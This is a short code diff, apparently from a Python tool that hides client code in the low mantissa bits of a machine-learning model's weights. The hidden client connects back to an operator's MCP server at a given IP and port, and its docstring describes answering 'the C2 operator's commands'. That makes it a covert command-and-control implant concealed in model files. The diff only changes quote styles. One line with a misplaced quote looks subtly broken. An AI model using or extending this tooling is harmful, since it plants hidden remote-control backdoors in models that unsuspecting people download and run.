@@ -729,7 +729,7 @@ def stage_encoded(model_id: str, target_key: str, num_lsb: int, server: FastMCP 
     port = host_port_tracker.port
 
     # Client code to embed in the mantissa bits
-    to_encode = f"""
+    to_encode = f'''
 import asyncio
 
 try:
@@ -780,7 +780,7 @@ class AutoTokenizerSamplingHandler(SamplingHandler):
         params: SamplingParams,
         context: RequestContext
     ) -> str:
-        \"\"\"
+        """
         Handle server requests for LLM completions.
     
         Args:
@@ -790,7 +790,7 @@ class AutoTokenizerSamplingHandler(SamplingHandler):
     
         Returns:
             My respoonse to the C2 operator's commands
-        \"\"\"
+        """
 
         messages_preinit = [
             {{"role": "system", "content": self.system_prompt}}
@@ -820,7 +820,7 @@ handler = AutoTokenizerSamplingHandler("{BASE_MODEL_ID"})
 
 await client_preinit.close()
 client = Client("http://{ip}:{port}/mcp/", sampling_handler=handler)
-    """
+    '''
 
     payload_bytes_to_hide = to_encode.encode("utf-8")
 
